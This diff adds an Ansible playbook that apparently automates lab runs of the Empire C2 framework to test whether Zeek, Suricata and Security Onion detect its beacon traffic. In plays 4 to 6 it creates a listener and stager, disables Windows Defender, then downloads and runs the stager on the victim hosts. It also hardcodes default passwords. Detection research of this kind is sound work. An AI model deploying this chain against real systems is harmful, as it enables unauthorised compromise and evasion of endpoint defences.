@@ -1,0 +1,906 @@
+---
+# playbooks/empire/run-single.yml — Complete single Empire C2 experiment run
+#
+# Usage:
+#   ansible-playbook -i inventory.yml playbooks/empire/run-single.yml \
+#     -e "run_id=EMP-HTTP-WIN-DEF-01 profile=http victim=windows"
+#
+# Required extra vars:
+#   run_id          — Experiment identifier, e.g. EMP-HTTP-WIN-DEF-01
+#
+# Optional extra vars (with defaults):
+#   profile         — http | https              (default: http)
+#   victim          — windows | linux           (default: windows)
+#   config_phase    — default | tuned           (default: default)
+#   beacon_duration — seconds to let beacon run (default: 1800)
+#   beacon_delay    — callback interval secs    (default: 60)
+#   beacon_jitter   — jitter fraction 0-1       (default: 0.1)
+
+######################################################################
+# Play 1 — Setup & metadata
+######################################################################
+- name: "Setup — {{ run_id }}"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  vars:
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _duration: "{{ beacon_duration | default(1800) | int }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(0.1) }}"
+    _config_phase: "{{ config_phase | default('default') }}"
+    _victim_ip: "{{ '172.16.20.10' if _victim == 'windows' else '172.16.20.11' }}"
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Remove stale run directory
+      file:
+        path: "{{ _run_dir }}"
+        state: absent
+
+    - name: Create run directory tree
+      file:
+        path: "{{ _run_dir }}/{{ item }}"
+        state: directory
+      loop: ["", pcap, zeek, suricata, seconion]
+
+    - name: Record start time
+      set_fact:
+        _run_start_time: "{{ lookup('pipe', 'date -Iseconds') }}"
+
+    - name: Write initial metadata
+      copy:
+        dest: "{{ _run_dir }}/metadata.json"
+        content: |
+          {
+            "run_id": "{{ run_id }}",
+            "framework": "empire",
+            "profile": "{{ _profile }}",
+            "victim": "{{ _victim }}",
+            "victim_ip": "{{ _victim_ip }}",
+            "beacon_delay": {{ _delay }},
+            "beacon_jitter": {{ _jitter }},
+            "beacon_duration": {{ _duration }},
+            "config_phase": "{{ _config_phase }}",
+            "start_time": "{{ _run_start_time }}",
+            "status": "running"
+          }
+
+    - debug:
+        msg: >-
+          ▶ {{ run_id }}  profile={{ _profile }}  victim={{ _victim }}
+          config={{ _config_phase }}  duration={{ _duration }}s
+          delay={{ _delay }}s  jitter={{ _jitter }}
+
+######################################################################
+# Play 2 — Rotate Zeek logs
+######################################################################
+- name: "Rotate Zeek logs"
+  hosts: sensor_zeek
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Restart Zeek for fresh logs
+      command: /opt/zeek/bin/zeekctl restart
+      changed_when: true
+
+    - name: Verify Zeek running
+      command: /opt/zeek/bin/zeekctl status
+      changed_when: false
+      register: zeek_status
+
+    - assert:
+        that: "'running' in zeek_status.stdout"
+        fail_msg: "Zeek failed to restart"
+
+    - name: Capture Zeek version
+      shell: /opt/zeek/bin/zeek --version 2>&1 | head -1
+      changed_when: false
+      register: _zeek_ver_raw
+
+    - set_fact:
+        _zeek_version: "{{ _zeek_ver_raw.stdout }}"
+
+    - name: Count loaded Zeek scripts
+      shell: grep -c '@load' /opt/zeek/share/zeek/site/local.zeek 2>/dev/null || echo 0
+      changed_when: false
+      register: _zeek_scripts_raw
+
+    - set_fact:
+        _zeek_script_count: "{{ _zeek_scripts_raw.stdout | int }}"
+
+######################################################################
+# Play 3 — Rotate Suricata logs
+######################################################################
+- name: "Rotate Suricata logs"
+  hosts: sensor_suricata
+  become: yes
+  gather_facts: no
+  tasks:
+    - name: Archive and remove old logs
+      shell: |
+        TS=$(date +%Y%m%d-%H%M%S)
+        mv /var/log/suricata/eve.json /var/log/suricata/eve-${TS}.json 2>/dev/null || true
+        mv /var/log/suricata/fast.log /var/log/suricata/fast-${TS}.log 2>/dev/null || true
+      args:
+        executable: /bin/bash
+
+    - name: Restart Suricata
+      systemd:
+        name: suricata
+        state: restarted
+
+    - name: Wait for Suricata to initialise
+      pause:
+        seconds: 10
+
+    - name: Verify Suricata active
+      command: systemctl is-active suricata
+      changed_when: false
+      register: suri_check
+
+    - assert:
+        that: "suri_check.stdout == 'active'"
+        fail_msg: "Suricata failed to restart"
+
+    - name: Capture Suricata version
+      shell: suricata -V 2>&1 | head -1
+      changed_when: false
+      register: _suri_ver_raw
+
+    - set_fact:
+        _suricata_version: "{{ _suri_ver_raw.stdout }}"
+
+    - name: Count Suricata rules
+      shell: grep -oP '\d+(?= signatures processed)' /var/log/suricata/suricata.log | tail -1 || echo 0
+      changed_when: false
+      register: _suri_rules_raw
+
+    - set_fact:
+        _suricata_rule_count: "{{ _suri_rules_raw.stdout | int }}"
+
+######################################################################
+# Play 4 — Empire setup, listener, stager, capture, HTTP server
+######################################################################
+- name: "Empire setup — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(0.1) }}"
+    _empire_api: "http://127.0.0.1:1337"
+    _empire_user: "empireadmin"
+    _empire_pass: "{{ empire_password | default('password123') }}"
+    _attacker_ip: "172.16.10.10"
+    _listener_port: "{{ 443 if _profile == 'https' else 8080 }}"
+    _listener_name: "{{ run_id }}-listener"
+    _stager_template: "{{ 'windows_launcher_bat' if _victim == 'windows' else 'linux_bash' }}"
+    _stager_name: "{{ run_id }}-stager"
+    _payload_file: "{{ run_id }}{{ '.bat' if _victim == 'windows' else '.sh' }}"
+    _payload_dir: "/home/labadmin/ise5901/empire/payloads"
+    _pcap_dir: "/home/labadmin/ise5901/empire/pcaps"
+  tasks:
+    # ── Pre-clean ─────────────────────────────────────────────────
+    - name: Kill leftover Empire server
+      shell: |
+        pgrep -f 'empire.py server' | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+        fuser -k 1337/tcp 2>/dev/null || true
+        fuser -k 8080/tcp 2>/dev/null || true
+        fuser -k 443/tcp 2>/dev/null || true
+        sleep 2
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Purge stale agents from Empire database
+      shell: |
+        mysql -u empire_user -pempire_password empire \
+          -e "DELETE FROM agents; DELETE FROM taskings;" 2>/dev/null || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Kill leftover tcpdump
+      shell: |
+        pgrep -f tcpdump | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Kill leftover HTTP payload server
+      shell: |
+        if [ -f /tmp/payload-server.pid ]; then
+          kill $(cat /tmp/payload-server.pid) 2>/dev/null || true
+          rm -f /tmp/payload-server.pid
+        fi
+        # Also kill any stale python http.server on port 9999
+        fuser -k 9999/tcp 2>/dev/null || true
+      args:
+        executable: /bin/bash
+      changed_when: false
+
+    - name: Wait for Empire port to free
+      shell: ss -tlnp | grep -q ':1337 ' && echo busy || echo free
+      register: _empire_port_check
+      until: _empire_port_check.stdout == 'free'
+      retries: 24
+      delay: 5
+      changed_when: false
+
+    - name: Wait for listener port to free
+      shell: ss -tlnp | grep -q ':{{ _listener_port }} ' && echo busy || echo free
+      register: _listener_port_check
+      until: _listener_port_check.stdout == 'free'
+      retries: 24
+      delay: 5
+      changed_when: false
+
+    - name: Ensure directories exist
+      file:
+        path: "{{ item }}"
+        state: directory
+        owner: labadmin
+        mode: "0755"
+      loop:
+        - "{{ _payload_dir }}"
+        - "{{ _pcap_dir }}"
+
+    - name: Clean old payload file
+      file:
+        path: "{{ _payload_dir }}/{{ _payload_file }}"
+        state: absent
+
+    # ── Start Empire ──────────────────────────────────────────────
+    - name: Start Empire server
+      shell: |
+        nohup powershell-empire server > /tmp/empire-server.log 2>&1 &
+        echo $! > /tmp/empire.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Wait for Empire API
+      uri:
+        url: "{{ _empire_api }}/healthz"
+        method: GET
+        validate_certs: no
+        status_code: 200
+      register: _api_health
+      until: _api_health.status == 200
+      retries: 24
+      delay: 5
+
+    # ── Authenticate ──────────────────────────────────────────────
+    - name: Authenticate to Empire
+      uri:
+        url: "{{ _empire_api }}/token"
+        method: POST
+        body_format: form-urlencoded
+        body:
+          username: "{{ _empire_user }}"
+          password: "{{ _empire_pass }}"
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+        validate_certs: no
+        status_code: 200
+      register: auth_result
+      retries: 3
+      delay: 5
+      until: auth_result.status == 200
+
+    - name: Store token
+      set_fact:
+        empire_token: "{{ auth_result.json.access_token }}"
+
+    - name: Capture Empire version
+      shell: powershell-empire --version 2>&1 | head -1 || echo "unknown"
+      changed_when: false
+      register: _empire_ver_raw
+      ignore_errors: yes
+
+    - set_fact:
+        _empire_version: "{{ _empire_ver_raw.stdout | default('unknown') }}"
+
+    # ── Cleanup old resources ─────────────────────────────────────
+    - name: List existing stagers
+      uri:
+        url: "{{ _empire_api }}/api/v2/stagers"
+        method: GET
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+      register: existing_stagers
+
+    - name: Delete existing stagers
+      uri:
+        url: "{{ _empire_api }}/api/v2/stagers/{{ item.id }}"
+        method: DELETE
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+        status_code: [200, 204]
+      loop: "{{ existing_stagers.json.records | default([]) }}"
+      when: existing_stagers.json.records | default([]) | length > 0
+
+    - name: List existing listeners
+      uri:
+        url: "{{ _empire_api }}/api/v2/listeners"
+        method: GET
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+      register: existing_listeners
+
+    - name: Delete existing listeners
+      uri:
+        url: "{{ _empire_api }}/api/v2/listeners/{{ item.id }}"
+        method: DELETE
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+        status_code: [200, 204]
+      loop: "{{ existing_listeners.json.records | default([]) }}"
+      when: existing_listeners.json.records | default([]) | length > 0
+
+    # ── Generate self-signed cert for HTTPS ───────────────────────
+    - name: Generate self-signed TLS certificate
+      shell: |
+        mkdir -p /home/labadmin/ise5901/empire/certs
+        openssl req -x509 -newkey rsa:2048 -keyout /home/labadmin/ise5901/empire/certs/empire-priv.key \
+          -out /home/labadmin/ise5901/empire/certs/empire-chain.pem -days 365 -nodes \
+          -subj "/CN={{ _attacker_ip }}" 2>&1
+        chown -R labadmin:labadmin /home/labadmin/ise5901/empire/certs
+        chmod 600 /home/labadmin/ise5901/empire/certs/empire-priv.key
+        chmod 644 /home/labadmin/ise5901/empire/certs/empire-chain.pem
+      args:
+        executable: /bin/bash
+      when: _profile == 'https'
+
+    # ── Create listener ───────────────────────────────────────────
+    - name: Create listener
+      uri:
+        url: "{{ _empire_api }}/api/v2/listeners"
+        method: POST
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        body_format: json
+        body:
+          name: "{{ _listener_name }}"
+          template: "http"
+          options:
+            Name: "{{ _listener_name }}"
+            Host: "{{ _profile }}://{{ _attacker_ip }}"
+            Port: "{{ _listener_port }}"
+            DefaultDelay: "{{ _delay }}"
+            DefaultJitter: "{{ _jitter }}"
+            CertPath: "{{ '/home/labadmin/ise5901/empire/certs' if _profile == 'https' else '' }}"
+        validate_certs: no
+        status_code: [200, 201]
+      register: listener_result
+
+    - debug:
+        msg: "Listener {{ _listener_name }} created (id={{ listener_result.json.id }})"
+
+    # ── Create stager ─────────────────────────────────────────────
+    - name: Create stager
+      uri:
+        url: "{{ _empire_api }}/api/v2/stagers"
+        method: POST
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        body_format: json
+        body:
+          name: "{{ _stager_name }}"
+          template: "{{ _stager_template }}"
+          options:
+            Listener: "{{ _listener_name }}"
+        validate_certs: no
+        status_code: [200, 201]
+      register: stager_result
+
+    - name: Extract download link
+      set_fact:
+        _stager_download: "{{ stager_result.json.downloads[0].link }}"
+
+    - debug:
+        msg: "Stager created — download: {{ _stager_download }}"
+
+    # ── Download stager file ──────────────────────────────────────
+    - name: Download stager payload
+      get_url:
+        url: "{{ _empire_api }}{{ _stager_download }}"
+        dest: "{{ _payload_dir }}/{{ _payload_file }}"
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        force: yes
+        mode: "0755"
+        validate_certs: no
+
+    - name: Verify payload file exists
+      stat:
+        path: "{{ _payload_dir }}/{{ _payload_file }}"
+      register: payload_stat
+
+    - assert:
+        that: "payload_stat.stat.exists and payload_stat.stat.size > 0"
+        fail_msg: "Stager payload file is missing or empty"
+
+    # ── Start packet capture ──────────────────────────────────────
+    - name: Detect lab network interface
+      shell: ip -o addr show | grep '172.16.10.10' | awk '{print $2}'
+      changed_when: false
+      register: lab_iface
+
+    - assert:
+        that: "lab_iface.stdout | length > 0"
+        fail_msg: "Cannot find interface with 172.16.10.10"
+
+    - name: Start tcpdump
+      shell: |
+        nohup tcpdump -i {{ lab_iface.stdout }} \
+          -w {{ _pcap_dir }}/{{ run_id }}.pcap \
+          > /tmp/tcpdump-{{ run_id }}.log 2>&1 &
+        echo $! > /tmp/tcpdump-{{ run_id }}.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Record capture start
+      shell: date -Iseconds
+      changed_when: false
+      register: capture_start
+
+    - set_fact:
+        _capture_start: "{{ capture_start.stdout }}"
+
+    # ── Serve payload via HTTP ────────────────────────────────────
+    - name: Start HTTP server for payload delivery
+      shell: |
+        cd {{ _payload_dir }}
+        nohup python3 -m http.server 9999 > /tmp/payload-server.log 2>&1 &
+        echo $! > /tmp/payload-server.pid
+      args:
+        executable: /bin/bash
+      changed_when: true
+
+    - name: Wait for HTTP server
+      wait_for:
+        host: 0.0.0.0
+        port: 9999
+        delay: 1
+        timeout: 10
+
+    - debug:
+        msg: >-
+          Empire ready — listener={{ _listener_name }}
+          stager={{ _stager_name }}
+          pcap started at {{ _capture_start }}
+
+######################################################################
+# Play 5 — Deploy stager to Windows victim
+######################################################################
+- name: "Deploy stager — Windows"
+  hosts: victims_windows
+  gather_facts: no
+  vars:
+    _attacker_ip: "172.16.10.10"
+    _payload_file: "{{ run_id }}{{ '.bat' if (victim | default('windows')) == 'windows' else '.sh' }}"
+  tasks:
+    - block:
+        - name: Disable Defender (exclusions + realtime monitoring)
+          raw: >-
+            powershell.exe -NoProfile -Command
+            "Add-MpPreference
+            -ExclusionPath 'C:\temp'
+            -ExclusionProcess 'powershell.exe','cmd.exe';
+            Set-MpPreference -DisableRealtimeMonitoring $true;
+            Write-Output 'Defender exclusions applied'"
+          register: defender_result
+          ignore_errors: yes
+
+        - name: Download stager via HTTP
+          raw: >-
+            powershell.exe -NoProfile -Command
+            "$ProgressPreference='SilentlyContinue';
+            Remove-Item -Force -EA SilentlyContinue 'C:\temp\{{ _payload_file }}';
+            New-Item -ItemType Directory -Force -Path C:\temp | Out-Null;
+            Invoke-WebRequest
+            -Uri 'http://{{ _attacker_ip }}:9999/{{ _payload_file }}'
+            -OutFile 'C:\temp\{{ _payload_file }}';
+            Write-Output ('Downloaded: ' + (Get-Item 'C:\temp\{{ _payload_file }}').Length + ' bytes')"
+          register: download_result
+
+        - debug:
+            msg: "{{ download_result.stdout_lines | default(['download done']) }}"
+
+        - name: Execute stager via WMI (detached)
+          raw: >-
+            powershell.exe -Command
+            "Invoke-WmiMethod -Class Win32_Process -Name Create
+            -ArgumentList 'cmd.exe /c C:\temp\{{ _payload_file }}';
+            Write-Output 'Stager launched'"
+          register: deploy_result
+
+        - debug:
+            msg: "Windows deploy: {{ deploy_result.stdout_lines | default(['done']) }}"
+      when: (victim | default('windows')) == 'windows'
+
+######################################################################
+# Play 6 — Deploy stager to Linux victim
+######################################################################
+- name: "Deploy stager — Linux"
+  hosts: victims_linux
+  gather_facts: no
+  vars:
+    _attacker_ip: "172.16.10.10"
+    _payload_file: "{{ run_id }}{{ '.bat' if (victim | default('windows')) == 'windows' else '.sh' }}"
+  tasks:
+    - block:
+        - name: Download and execute stager
+          shell: |
+            curl -s -o /tmp/{{ _payload_file }} http://{{ _attacker_ip }}:9999/{{ _payload_file }}
+            chmod +x /tmp/{{ _payload_file }}
+            nohup /tmp/{{ _payload_file }} > /dev/null 2>&1 &
+            disown
+            echo "Stager deployed"
+          args:
+            executable: /bin/bash
+          register: deploy_result
+
+        - debug:
+            msg: "Linux deploy: {{ deploy_result.stdout_lines | default(['done']) }}"
+      when: (victim | default('windows')) == 'linux'
+
+######################################################################
+# Play 7 — Wait for agent check-in
+######################################################################
+- name: "Wait for agent — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _empire_api: "http://127.0.0.1:1337"
+  tasks:
+    - name: Poll for agent check-in
+      uri:
+        url: "{{ _empire_api }}/api/v2/agents"
+        method: GET
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+      register: agents_result
+      until: (agents_result.json.records | default([]) | selectattr('listener', 'equalto', run_id ~ '-listener') | list) | length > 0
+      retries: 60
+      delay: 10
+
+    - set_fact:
+        _my_agent: "{{ agents_result.json.records | selectattr('listener', 'equalto', run_id ~ '-listener') | first }}"
+
+    - debug:
+        msg: >-
+          Agent checked in: {{ _my_agent.name }}
+          ({{ _my_agent.session_id | default('unknown') }})
+
+######################################################################
+# Play 8 — Beacon duration wait
+######################################################################
+- name: "Beacon wait — {{ beacon_duration | default(1800) }}s"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  tasks:
+    - name: "Wait for beacon traffic ({{ beacon_duration | default(1800) }}s)"
+      pause:
+        seconds: "{{ beacon_duration | default(1800) | int }}"
+
+######################################################################
+# Play 9 — Teardown (kill agents, stop processes)
+######################################################################
+- name: "Teardown — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _empire_api: "http://127.0.0.1:1337"
+  tasks:
+    - name: List active agents
+      uri:
+        url: "{{ _empire_api }}/api/v2/agents"
+        method: GET
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        validate_certs: no
+      register: active_agents
+      ignore_errors: yes
+
+    - name: Kill each agent
+      uri:
+        url: "{{ _empire_api }}/api/v2/agents/{{ item.session_id }}/tasks/exit"
+        method: POST
+        headers:
+          Authorization: "Bearer {{ empire_token }}"
+        body_format: json
+        body: {}
+        validate_certs: no
+        status_code: [200, 201, 404]
+      loop: "{{ active_agents.json.records | default([]) }}"
+      when: active_agents is succeeded
+      ignore_errors: yes
+
+    - name: Stop tcpdump
+      shell: |
+        if [ -f /tmp/tcpdump-{{ run_id }}.pid ]; then
+          kill $(cat /tmp/tcpdump-{{ run_id }}.pid) 2>/dev/null || true
+          rm -f /tmp/tcpdump-{{ run_id }}.pid
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Stop HTTP server
+      shell: |
+        if [ -f /tmp/payload-server.pid ]; then
+          kill $(cat /tmp/payload-server.pid) 2>/dev/null || true
+          rm -f /tmp/payload-server.pid
+        fi
+      args:
+        executable: /bin/bash
+
+    - name: Stop Empire server
+      shell: |
+        if [ -f /tmp/empire.pid ]; then
+          kill $(cat /tmp/empire.pid) 2>/dev/null || true
+          rm -f /tmp/empire.pid
+        fi
+        pgrep -f 'powershell-empire' | grep -v "^$$\$" | xargs -r kill 2>/dev/null || true
+      args:
+        executable: /bin/bash
+
+    - name: Record capture end
+      shell: date -Iseconds
+      changed_when: false
+      register: capture_end
+
+    - debug:
+        msg: "Teardown complete — capture ended {{ capture_end.stdout }}"
+
+######################################################################
+# Play 9b — Clean victim & re-enable defences
+######################################################################
+- name: "Victim cleanup — Windows"
+  hosts: victims_windows
+  gather_facts: no
+  tasks:
+    - block:
+        - name: Kill stager processes
+          raw: >-
+            powershell.exe -Command
+            "Get-Process -Name powershell -ErrorAction SilentlyContinue |
+            Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue;
+            Write-Output 'Cleaned'"
+          ignore_errors: yes
+
+        - name: Remove stager file
+          raw: >-
+            powershell.exe -Command
+            "Remove-Item -Force -EA SilentlyContinue 'C:\temp\{{ run_id }}*';
+            Write-Output 'Removed'"
+          ignore_errors: yes
+
+        - name: Re-enable Defender real-time monitoring
+          raw: >-
+            powershell.exe -Command
+            "Set-MpPreference -DisableRealtimeMonitoring $false;
+            Write-Output 'Defender RT re-enabled'"
+          ignore_errors: yes
+      when: (victim | default('windows')) == 'windows'
+
+######################################################################
+# Play 10 — Collect Zeek logs
+######################################################################
+- name: "Collect Zeek — {{ run_id }}"
+  hosts: sensor_zeek
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Archive Zeek current logs
+      archive:
+        path: /opt/zeek/logs/current/
+        dest: /tmp/zeek-{{ run_id }}.tar.gz
+        format: gz
+
+    - name: Fetch Zeek archive
+      fetch:
+        src: /tmp/zeek-{{ run_id }}.tar.gz
+        dest: "{{ _run_dir }}/zeek/"
+        flat: yes
+
+    - name: Clean remote archive
+      file:
+        path: /tmp/zeek-{{ run_id }}.tar.gz
+        state: absent
+
+######################################################################
+# Play 11 — Collect Suricata logs
+######################################################################
+- name: "Collect Suricata — {{ run_id }}"
+  hosts: sensor_suricata
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Fetch eve.json
+      fetch:
+        src: /var/log/suricata/eve.json
+        dest: "{{ _run_dir }}/suricata/eve-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Fetch fast.log
+      fetch:
+        src: /var/log/suricata/fast.log
+        dest: "{{ _run_dir }}/suricata/fast-{{ run_id }}.log"
+        flat: yes
+      ignore_errors: yes
+
+######################################################################
+# Play 12 — Collect Security Onion
+######################################################################
+- name: "Collect SO — {{ run_id }}"
+  hosts: sensor_seconion
+  become: yes
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+    _start_time: "{{ hostvars['localhost']._run_start_time }}"
+    _end_time: "{{ lookup('pipe', 'date -Iseconds') }}"
+  tasks:
+    - name: Capture SO version
+      shell: cat /etc/soversion 2>/dev/null || echo "unknown"
+      changed_when: false
+      register: _so_ver_raw
+
+    - set_fact:
+        _so_version: "{{ _so_ver_raw.stdout }}"
+
+    - name: Export SO Suricata alerts
+      shell: |
+        so-elasticsearch-query '.ds-logs-suricata.alerts-so-*/_search' \
+          -d '{"query":{"range":{"@timestamp":{"gte":"{{ _start_time }}","lte":"{{ _end_time }}"}}},"size":10000}' \
+          > /tmp/so-suricata-{{ run_id }}.json 2>/dev/null || true
+      changed_when: false
+
+    - name: Export SO Zeek logs
+      shell: |
+        so-elasticsearch-query '.ds-logs-zeek-so-*/_search' \
+          -d '{"query":{"range":{"@timestamp":{"gte":"{{ _start_time }}","lte":"{{ _end_time }}"}}},"size":10000}' \
+          > /tmp/so-zeek-{{ run_id }}.json 2>/dev/null || true
+      changed_when: false
+
+    - name: Fetch SO Suricata alerts
+      fetch:
+        src: /tmp/so-suricata-{{ run_id }}.json
+        dest: "{{ _run_dir }}/seconion/so-suricata-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Fetch SO Zeek logs
+      fetch:
+        src: /tmp/so-zeek-{{ run_id }}.json
+        dest: "{{ _run_dir }}/seconion/so-zeek-{{ run_id }}.json"
+        flat: yes
+      ignore_errors: yes
+
+    - name: Clean remote files
+      file:
+        path: "/tmp/{{ item }}"
+        state: absent
+      loop:
+        - "so-suricata-{{ run_id }}.json"
+        - "so-zeek-{{ run_id }}.json"
+      ignore_errors: yes
+
+######################################################################
+# Play 13 — Collect pcap from attacker
+######################################################################
+- name: "Collect pcap — {{ run_id }}"
+  hosts: attackers
+  become: yes
+  gather_facts: no
+  vars:
+    _pcap_dir: "/home/labadmin/ise5901/empire/pcaps"
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+  tasks:
+    - name: Fetch pcap
+      fetch:
+        src: "{{ _pcap_dir }}/{{ run_id }}.pcap"
+        dest: "{{ _run_dir }}/pcap/"
+        flat: yes
+      ignore_errors: yes
+
+######################################################################
+# Play 14 — Finalize metadata and manifest
+######################################################################
+- name: "Finalize — {{ run_id }}"
+  hosts: localhost
+  connection: local
+  gather_facts: no
+  vars:
+    _run_dir: "/home/ubuntu/ise5901-lab/runs/{{ run_id }}"
+    _profile: "{{ profile | default('http') }}"
+    _victim: "{{ victim | default('windows') }}"
+    _duration: "{{ beacon_duration | default(1800) | int }}"
+    _delay: "{{ beacon_delay | default(60) | int }}"
+    _jitter: "{{ beacon_jitter | default(0.1) }}"
+    _victim_ip: "{{ '172.16.20.10' if _victim == 'windows' else '172.16.20.11' }}"
+  tasks:
+    - name: Read start time from metadata
+      slurp:
+        src: "{{ _run_dir }}/metadata.json"
+      register: _meta_raw
+
+    - name: Update metadata with end time
+      copy:
+        dest: "{{ _run_dir }}/metadata.json"
+        content: |
+          {
+            "run_id": "{{ run_id }}",
+            "framework": "empire",
+            "profile": "{{ _profile }}",
+            "victim": "{{ _victim }}",
+            "victim_ip": "{{ _victim_ip }}",
+            "config_phase": "{{ config_phase | default('default') }}",
+            "beacon_delay": {{ _delay }},
+            "beacon_jitter": {{ _jitter }},
+            "beacon_duration": {{ _duration }},
+            "start_time": "{{ (_meta_raw.content | b64decode | from_json).start_time }}",
+            "end_time": "{{ lookup('pipe', 'date -Iseconds') }}",
+            "status": "complete",
+            "sensor_versions": {
+              "zeek": "{{ hostvars['mon-zeek-01']._zeek_version | default('unknown') }}",
+              "zeek_script_count": {{ hostvars['mon-zeek-01']._zeek_script_count | default(0) }},
+              "suricata": "{{ hostvars['mon-suricata-01']._suricata_version | default('unknown') }}",
+              "suricata_rule_count": {{ hostvars['mon-suricata-01']._suricata_rule_count | default(0) }},
+              "security_onion": "{{ hostvars['mon-seconion-01']._so_version | default('unknown') }}",
+              "empire": "{{ hostvars['atk-kali-01']._empire_version | default('unknown') }}"
+            }
+          }
+
+    - name: List collected artifacts
+      find:
+        paths: "{{ _run_dir }}"
+        recurse: yes
+      register: collected_files
+
+    - name: Generate artifact checksums
+      shell: |
+        cd {{ _run_dir }}
+        find . -type f ! -name manifest.txt -exec sha256sum {} \;
+      register: checksums
+
+    - name: Write manifest
+      copy:
+        dest: "{{ _run_dir }}/manifest.txt"
+        content: |
+          Run ID: {{ run_id }}
+          Profile: {{ _profile }}
+          Victim: {{ _victim }}
+          Config: {{ config_phase | default('default') }}
+          Completed: {{ lookup('pipe', 'date -Iseconds') }}
+          Files: {{ collected_files.matched }}
+          {% for f in collected_files.files %}
+          - {{ f.path | replace(_run_dir + '/', '') }} ({{ f.size }} bytes)
+          {% endfor %}
+
+          SHA-256 Checksums:
+          {{ checksums.stdout }}
+
+    - debug:
+        msg: >-
+          ✓ {{ run_id }} complete — {{ collected_files.matched }} artifacts
+          in runs/{{ run_id }}/
